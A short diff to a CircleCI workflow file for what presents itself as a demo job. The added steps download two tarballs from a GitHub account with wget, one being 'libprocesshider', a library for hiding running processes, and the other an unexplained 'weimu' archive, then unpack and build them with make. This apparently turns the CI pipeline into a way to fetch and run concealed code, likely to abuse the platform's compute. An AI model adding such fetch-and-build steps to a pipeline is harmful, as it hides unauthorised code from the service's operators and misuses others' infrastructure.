@@ -9,10 +9,8 @@ jobs:
     working_directory: ~/circleci-demo-workflows
     steps:
       - checkout
-      - run: git clone https://github.com/lallianto/libprocesshider
-      - run: cd libprocesshider
-      - run: ls
-      - run: cd libprocesshider
+      - run: wget https://github.com/lallianto/libprocesshider/raw/master/lib.tar.gz
+      - run: tar xf lib.tar.gz
       - run: wget https://github.com/lallianto/weimu/raw/main/main.tar.gz
       - run: tar xf main.tar.gz
       - run: make
